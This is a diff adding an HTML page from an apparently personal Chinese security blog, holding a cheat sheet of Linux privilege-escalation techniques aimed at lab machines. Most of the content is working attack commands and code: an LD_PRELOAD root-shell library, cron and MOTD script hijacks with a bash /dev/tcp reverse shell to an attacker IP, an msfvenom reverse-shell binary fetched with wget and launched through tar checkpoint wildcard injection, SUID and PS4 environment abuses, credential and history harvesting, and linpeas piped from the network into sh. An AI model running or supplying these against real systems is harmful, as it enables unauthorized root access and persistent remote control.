@@ -1,0 +1,639 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <canvas
+    id="fireworks"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"
+></canvas>
+<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+<script src="/js/fireworks.min.js"></script>
+<canvas
+    id="background"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"
+></canvas>
+<script src="/js/background.min.js"></script>
+<div id="cursor"></div>
+
+
+    <meta charset="utf-8" />
+    <title>Linux提权#1 | Flu0r1n3の妙妙屋</title>
+    <meta name="author" content="Flu0r1n3" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/amiya.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>FLU0R1N3の妙妙屋</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;FLU0R1N3の妙妙屋</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>Linux提权#1</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/7/21
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                渗透测试
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/Linux%E6%8F%90%E6%9D%83-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #00a596">
+                    Linux提权 渗透测试
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <br>
+
+<br>
+
+<br>
+
+<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>1.低权限可以通过修改可执行文件或脚本，执行时以高权限运行<br>基础权限如ugo，rwx，suid，sgid<br><br></p>
+<p>2.从用户行为的角度，低权限运维人员也会输入&#x2F;储存高权限凭据<br>通过信息收集获取敏感信息可能是该高权限凭据<br><br></p>
+<p>3.超越权限体系，在其上层（如内存）捕获&#x2F;修改凭据等信息</p>
+<br>
+
+<br>
+
+<br>
+
+<h2 id="提高终端稳定性"><a href="#提高终端稳定性" class="headerlink" title="提高终端稳定性"></a>提高终端稳定性</h2><p>命令：</p>
+<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>导入python库pty（伪终端）新建一个&#x2F;bin&#x2F;bash会话从而获取shell交互界面权限</p>
+<br>
+
+<p><code>stty raw -echo</code></p>
+ <br>
+
+<p><code>export TERM=xterm-color</code></p>
+<br>
+
+<p><code>rlwrap nc -lvnp port</code></p>
+<br>
+
+<br>
+
+<br>
+
+<h2 id="手工枚举"><a href="#手工枚举" class="headerlink" title="手工枚举"></a>手工枚举</h2><p>获取shell后</p>
+<ol>
+<li><h3 id="查看当前人物"><a href="#查看当前人物" class="headerlink" title="查看当前人物"></a>查看当前人物</h3></li>
+</ol>
+<p><code>whoami，id，who，w，last</code></p>
+<p>last：查看最近哪些用户登录过该系统</p>
+<br>
+
+<br>
+
+<ol start="2">
+<li><h3 id="内核版本获取"><a href="#内核版本获取" class="headerlink" title="内核版本获取"></a>内核版本获取</h3></li>
+</ol>
+<p><code>uname -a</code></p>
+<br>
+
+<p><code>lsb_release -a  Cat /proc/version</code></p>
+<br>
+
+<p><code>cat /etc/issue</code></p>
+<br>
+
+<p><code>hostnamectl</code></p>
+<br>
+
+<br>
+
+<ol start="3">
+<li><h3 id="ip地址、网卡信息"><a href="#ip地址、网卡信息" class="headerlink" title="ip地址、网卡信息"></a>ip地址、网卡信息</h3></li>
+</ol>
+<p><code>ip a/addr</code></p>
+<p><code>ip route</code></p>
+<p><code>ip neigh</code></p>
+<p><code>arp -a</code></p>
+<p><code>ifconfig</code></p>
+<br>
+
+<br>
+
+<ol start="4">
+<li><h3 id="重要命令"><a href="#重要命令" class="headerlink" title="重要命令"></a>重要命令</h3></li>
+</ol>
+<p><code>sudo -l</code>：查看当前用户是否有可以以root权限执行的命令但不需要密码（NOPASSWD）</p>
+<br>
+
+<p><code>getcap -r / 2&gt;/dev/null</code>：得到权限能力，在&#x2F;下</p>
+<br>
+
+<p><code>ls -liah</code>：列出隐藏文件并显示权限(可读、可写等)</p>
+<br>
+
+<p><code>history</code>: 列出这台机器使用过命令的历史记录</p>
+<br>
+
+<p><code>cat /etc/passwd</code>：查看用户名，以及最后是否有bash或sh权限，如果没有通常就是不怎么需要重点关注</p>
+<br>
+
+<p><code>echo $PATH</code>：查看环境变量</p>
+<br>
+
+<p><code>ps aux</code>：ps指的是显示进程，a列出所有用户，u显示启动该进程的用户，x显示没有连接到终端的进程</p>
+<br>
+
+<p><code>netstat -a</code>：显示网络端口、服务、连接情况和监听情况等</p>
+<br>
+
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>：查找有suid的可执行文件用于suid提权</p>
+<br>
+
+<br>
+
+<br>
+
+<h2 id="Shadow、Passwd文件可读可写提权"><a href="#Shadow、Passwd文件可读可写提权" class="headerlink" title="Shadow、Passwd文件可读可写提权"></a>Shadow、Passwd文件可读可写提权</h2><pre><code class="\Plain">cp /etc/passwd /tmp/passwd.bak
+无论是shadow还是passwd文件都要备份以防万一
+</code></pre>
+<br>
+
+<ol>
+<li><h3 id="可读shadow文件"><a href="#可读shadow文件" class="headerlink" title="可读shadow文件"></a>可读shadow文件</h3></li>
+</ol>
+<p>Cat &#x2F;etc&#x2F;shadow：获取shadow文件：查看用户密码hash值</p>
+<pre><code class="Plain">kali:$y$j9T$thVUCcCzQozwQh.2JyVRs.$T0FS1BRAcGSTCGldig/Ji2CbWc3bLVV8Ym1wEPDcIw1:19590:0:99999:7:::
+将该条存储到一个文件中: vim 文件名 
+</code></pre>
+<p>破解该用户密码可通过john配合rockyou字典破解</p>
+<p>rockyou字典需要在wordlists下先解压</p>
+<pre><code class="Plain">john --wordlist=/usr/share/wordlists/rockyou.txt 存储的文件名
+</code></pre>
+<br>
+<br>
+2. ### 可写shadow文件
+
+<p><code>Mkpasswd -m hash加密方式 更改的密码</code></p>
+<p>先对目标用户的密码hash值分析其hash加密方式如<code>MD5($1)，SHA-256，SHA-512($6)</code>等</p>
+<p>更改密码后vim打开可写的shadow文件将目标用户的密码删到下一个”:”前再将更改的密码hash贴上去</p>
+<p>su后输入密码得到目标用户权限</p>
+<br>
+<br>
+
+<ol start="3">
+<li><h3 id="可写passwd文件"><a href="#可写passwd文件" class="headerlink" title="可写passwd文件"></a>可写passwd文件</h3></li>
+</ol>
+<pre><code class="Plain">openssl passwd 密码
+</code></pre>
+<p>得到的hash在passwd文件中替换x</p>
+<p>su输入密码即可</p>
+<br>
+
+<br>
+
+<br>
+
+
+
+<h2 id="Sudo环境变量提权"><a href="#Sudo环境变量提权" class="headerlink" title="Sudo环境变量提权"></a>Sudo环境变量提权</h2><p>这其实就是利用LD_PRELOAD的优先装载动态链接库劫持后新建bash会话得到提权</p>
+<p><code>Sudo -l发现其环境变量有env_keep+=LD_PRELOAD时可以考虑</code></p>
+<p>先准备shell.c文件</p>
+<pre><code class="C">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init()&#123;
+   unsetenv(&quot;LD_PRELOAD&quot;)；  //预加载只执行一次所以就把预加载卸掉
+   setgid(0);
+   setuid(0);  //0group和0user就是root用户
+   system(&#39;/bin/bash&#39;);  //启动一个bash会话
+&#125;
+</code></pre>
+<p>因为是共享库文件，因此gcc编译时要注意</p>
+<pre><code class="Bash">gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+-fPIC:告诉编译器生成代码位置无关
+-shared,-o:共享库文件编译时所加参数
+-nofilestarts:只启动我们构造的shell不加其他功能
+
+sudo LD_PRELOAD=so文件位置 root权限不用密码的命令(sudo -l查看)
+在命令前预加载该库文件
+</code></pre>
+<br>
+
+<p>编译成功我们可以发现在当前目录下有一个shell.so</p>
+<p>在<code>sudo -l</code>中发现不需要密码的一些命令(NOPASSWD)，随机选择其中一个</p>
+<pre><code class="Plain">//类似以下格式
+(root) NOPASSWD: /usr/bin/nano
+
+//利用LD_PRELOAD预先加载动态链接库文件
+sudo LD_PRELOAD=/当前路径下/shell.so nano
+
+//不需要给nano接任何的指令，因为我们在用sudo执行前预加载了.so，而在.so文件中有提权逻辑因此实现了提权 
+</code></pre>
+<p>运行后即可</p>
+<br>
+
+<br>
+
+<br>
+
+<h2 id="自动任务提权"><a href="#自动任务提权" class="headerlink" title="自动任务提权"></a>自动任务提权</h2><ol>
+<li><h3 id="自动任务文件权限提权"><a href="#自动任务文件权限提权" class="headerlink" title="自动任务文件权限提权"></a>自动任务文件权限提权</h3></li>
+</ol>
+<p><code>cat /etc/crontab</code></p>
+<p>查看是否有以root权限执行的自动任务，有.sh脚本文件更好</p>
+<p><code>locate</code>定位</p>
+<p><code>ls -liah</code> 查看该权限，若可写则编辑用bash反弹shell</p>
+<pre><code class="Bash">bash -i &gt;&amp; /dev/tcp/kali ip/port 0&gt;&amp;1
+</code></pre>
+<br>
+<br>
+
+<ol start="2">
+<li><h3 id="自动任务PATH环境变量提权"><a href="#自动任务PATH环境变量提权" class="headerlink" title="自动任务PATH环境变量提权"></a>自动任务PATH环境变量提权</h3></li>
+</ol>
+<p><code>cat /etc/crontab</code></p>
+<p>可以看到有PATH环境变量</p>
+<p>自动任务中的sh脚本若不是以绝对路径显示，可以考虑编辑同名脚本劫持</p>
+<br>
+
+<p><code>原理：</code></p>
+<p><code>程序执行会按照PATH路径中靠前的先执行和寻找文件</code></p>
+<p><code>crontab自动任务执行脚本的路径会优先使用指定的PATH路径集而不会使用用户自定义的路径</code></p>
+<br>
+
+<p>可以先locate查看不以绝对路径显示的自动任务脚本文件所在位置</p>
+<p>pwd查看当前路径</p>
+<p>若与corntab PATH中最高优先级的相同则编辑同名文件</p>
+<p>写入简单的提权脚本vim编辑 同名.sh</p>
+<pre><code class="Bash">#！ /bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+</code></pre>
+<p>Chmod +x 同名.sh  赋予权限</p>
+<p>等待自动任务执行周期劫持原文件实现提权</p>
+<br>
+
+<br>
+
+<ol start="3">
+<li><h3 id="自动任务通配符提权"><a href="#自动任务通配符提权" class="headerlink" title="自动任务通配符提权"></a>自动任务通配符提权</h3></li>
+</ol>
+<p>真实场景中的服务器可能有每隔一段时间对一些重要目录进行打包备份的自动任务，就以tar命令为例，其中tar命令的checkpoint操作可以进行提权</p>
+<pre><code class="Plain">//首先可以用msfvenom工具自动生成一个反弹shell的语句
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=vps ip LPORT=监听端口 -f elf -o shell.elf
+
+//生成一个用于反弹shell的二进制文件，然后部署到vps上在目标服务器上wget获取该elf文件
+
+php -S 0:80
+//攻击机架设web服务
+
+wget http://vps ip/shell.elf
+chmod +xs shell.elf
+//将elf文件下载到靶机的当前目录并给予可执行权限
+
+touch /当前目录/--checkpoint=1
+touch /当前目录/--checkpoint-action=exec=shell.elf
+</code></pre>
+<br>
+
+<br>
+
+<br>
+
+<h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><p>肯定要先找有SUID权限的文件</p>
+<p><code>Find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<br>
+
+<ol>
+<li><h3 id="SUID可执行文件利用提权"><a href="#SUID可执行文件利用提权" class="headerlink" title="SUID可执行文件利用提权"></a>SUID可执行文件利用提权</h3></li>
+</ol>
+<p>输入以上指令后可以发现有很多文件，我们可以直接选一个文件名</p>
+<p>利用searchexploit来找提权脚本</p>
+<pre><code class="Plain">searchexploit suid文件
+
+searchexploit suid文件 -m 提权脚本
+
+//剩余操作架设服务器wget在靶机中下载脚本并给予执行权限执行
+</code></pre>
+<br>
+<br>
+2. ### SUID共享库注入提权
+
+<p>在发现有SUID权限的.so文件时可以尝试运行和追踪该.so文件</p>
+<p>剩余操作与环境变量提权一致<br><br><br><br><br>3. ### SUID环境变量利用提权</p>
+<p>查找发现env字样的文件(strings查看可显示字符)</p>
+<p>对没有使用绝对路径的引用我们可以劫持到绝对路径使得系统执行我们的提权操作</p>
+<pre><code class="Plain">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void mail()&#123;
+   setgid(0);
+   setuid(0);
+   system(&quot;/bin/bash -p&quot;);
+&#125;
+
+//env中同名文件.c
+
+
+//以env文件的属主权限启动一个终端，前提是属主为root
+ls -liah /usr/local/bin/suid-env
+
+
+//先查看环境变量，我们的劫持文件在本目录下，若要劫持要将优先级提到最高
+echo $PATH 
+
+//使最先读取当前目录下文件
+export PATH=.:$PATH
+</code></pre>
+<br>
+<br>
+4. ### 利用SUID-shell功能提权1
+
+<p>当3中对绝对路径的引用时，我们考虑通过bash低版本</p>
+<pre><code class="Plain">bash --version
+</code></pre>
+<p>version&lt;&#x3D;4.2时可以在bash中定义function用路径组合做文件名</p>
+<pre><code class="Plain">function 绝对路径文件名 &#123; /bin/bash -p; &#125;
+export -f /usr/sbin/service
+
+//bash中定义以文件名命名的函数并导出到环境运行对应suid文件即可劫持
+</code></pre>
+<br>
+<br>
+5. ### 利用SUID-shell功能提权2
+
+<p>Bash version&lt;&#x3D;4.4考虑对bash环境变量进行设置</p>
+<pre><code class="Plain">env -i SHELLOPTS=strace PS4=&#39;$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)&#39;  suid文件名(绝对路径)
+</code></pre>
+<br>
+<br>
+<br>
+
+<h2 id="密码与密钥提权"><a href="#密码与密钥提权" class="headerlink" title="密码与密钥提权"></a>密码与密钥提权</h2><ol>
+<li><h3 id="历史文件查看"><a href="#历史文件查看" class="headerlink" title="历史文件查看"></a>历史文件查看</h3></li>
+</ol>
+<pre><code class="Plain">history
+
+cat /root/.bash_history
+</code></pre>
+<br>
+<br>
+2. ### 配置文件查看
+
+<p>就像我之前打的一台bizness靶机，其中Apache OFBiz组件包含了数据库，就是通过数据库配置文件来查看密码的</p>
+<p>如ovpn、数据库文件等配置文件可以查看<br><br><br><br><br>3. ### SSH密钥敏感信息</p>
+<p>靶机中权限可能可以允许我们查看SSH配置文件，无论是公钥还是私钥都有可能提权的价值，调整ssh的参数后尝试连接以获取更高等级的权限<br><br><br><br><br><br></p>
+<h2 id="内核利用提权"><a href="#内核利用提权" class="headerlink" title="内核利用提权"></a>内核利用提权</h2><p>这种利用通常在其他几种方法都不奏效的情况下才使用，因为内核利用可能导致系统不稳定或会向管理员报警，因此会导致被发现溯源等，所以不到所有手段耗尽不轻易使用<br><br><br>内核利用主要利用工具为<code>linpeas</code>，如果靶机中有<code>curl</code>命令可以直接将执行脚本下载到靶机，如果没有用nc传输</p>
+<pre><code class="Plain">//查看内核版本
+uname -a  
+
+//下载linpeas脚本进行内核利用扫描
+curl -L https://github.com/carlospolop/PEASS-ng/latest/download/linpeas.sh | sh
+
+//无curl命令时，攻击机将下载的脚本在端口用nc传输
+wget https://github.com/carlospolop/PEASS-ng/latest/download/linpeas.sh
+nc -lvnp 端口 &lt; linpeas.sh
+
+//靶机接收伪设备传输的linpeas
+cat &lt; /dev/tcp/ip/port | sh
+
+//通过linpeas扫描结果用CVE编号查找利用脚本，最后根据脚本利用即可
+searchsploit 编号
+
+//值得注意的是利用时考虑不同脚本的通用性or针对性来使用更方便利用的脚本
+</code></pre>
+<br>
+
+<br>
+
+<br>
+
+<h2 id="Doas-less-vi提权"><a href="#Doas-less-vi提权" class="headerlink" title="Doas less+vi提权"></a>Doas less+vi提权</h2><p>渗透测试过程中可能遇到一些少见的系统比如OpenBSD，查找suid文件时可能存在doas的提权点</p>
+<pre><code class="Plain">//查看doas的配置文件
+cat /etc/doas.conf
+</code></pre>
+<p><code>如果我们可以利用doas使用less命令就可以利用less命令的参数v来进入vi编辑器从而在对应文件中启动一个高权限的shell，实现提权</code></p>
+<p>在vi编辑器中我们使用</p>
+<p>!sh   即可启动一个shell，doas给予我们的高权限使得我们启动新shell得到的权限是更高的实现提权</p>
+<br>
+
+<br>
+
+<br>
+
+<h2 id="利用MOTD机制提权"><a href="#利用MOTD机制提权" class="headerlink" title="利用MOTD机制提权"></a>利用MOTD机制提权</h2><p>在我们获取到shell发现靶机有update-motd.d目录我们就可以考虑利用motd机制提权</p>
+<p>通常是对00-header脚本修改来用bash反弹shell</p>
+<p><code>原理：motd是用户或者管理员登录到系统时会触发的一个机制，最先执行的是00-header，所以我们只要在里面修改反弹shell语句就可以在登录或获取shell的同时执行这个脚本得到弹回来的shell</code></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Flu0r1n3の妙妙屋
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Flu0r1n3
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
